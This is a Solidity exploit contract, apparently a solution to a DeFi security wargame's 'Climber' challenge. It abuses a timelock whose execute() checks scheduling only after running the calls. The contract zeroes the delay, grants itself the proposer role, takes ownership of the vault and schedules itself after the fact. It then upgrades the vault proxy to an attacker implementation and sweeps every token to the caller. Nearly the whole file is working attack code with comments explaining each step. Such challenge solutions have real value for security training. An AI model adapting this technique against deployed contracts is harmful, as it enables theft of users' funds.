// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IVault {
    function transferOwnership(address newOwner) external;

    function upgradeTo(address newImplementation) external;

    function sweepFunds(address tokenAddress) external;
}

interface ITimelock {
    function grantRole(bytes32 role, address account) external;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function updateDelay(uint64 newDelay) external;
}

contract ClimberAttacker {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    IVault private immutable vault;
    ITimelock private immutable timelock;
    IERC20 private immutable token;
    IVault private immutable attackerVault;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(
        address _vault,
        address _timelock,
        address _token,
        address _attackerVault
    ) {
        vault = IVault(_vault);
        timelock = ITimelock(_timelock);
        token = IERC20(_token);
        attackerVault = IVault(_attackerVault);
    }

    function exploit() public {
        // `execute()` function executes multiple scheduled operations before
        // actually checking if the operation was scheduled. We can do the
        // following set of calls to make the transaction not revert:
        //
        // 1. Call `updateDelay()` and set the delay to 0 to pass the
        //    "ReadyForExecution" check
        // 2. Grant this contract the PROPOSER_ROLE using `grantRole()`
        // 3. The timelock contract owns the vault contract, so we can transfer
        //    ownership to us.
        // 4. Call this contract's `schedule()` function.
        //
        // The reason we can't call the schedule() function directly is because
        // `targets`, `values`, and `dataElements` will never match, since
        // dataElements changes as we set it (I think so at least). Also, we
        // always call schedule() last so that the operations match.

        // updateDelay()
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSelector(timelock.updateDelay.selector, 0)
        );

        // grantRole()
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSelector(
                timelock.grantRole.selector,
                PROPOSER_ROLE,
                address(this)
            )
        );

        // transferOwnership()
        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSelector(
                vault.transferOwnership.selector,
                address(this)
            )
        );

        // schedule()
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSelector(this.callSchedule.selector));

        // Now, execute!
        timelock.execute(targets, values, dataElements, 0);

        // Now, we're the owner of the vault. We can upgrade the implementation
        // contract on the proxy to our own deployed vault contract.
        vault.upgradeTo(address(attackerVault));

        // Now, we can call our own sweepFunds() function to get all the tokens,
        // and then finally transfer it to the attacker wallet.
        //
        // Remember that `vault` here is just the proxy. We changed the
        // implementation to `attackerVault`, but it's the proxy that contains
        // the storage, so it's the proxy that has the tokens. We must call
        // transfer through the proxy, not through `attackerVault`.
        vault.sweepFunds(address(token));
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function callSchedule() public {
        timelock.schedule(targets, values, dataElements, 0);
    }
}
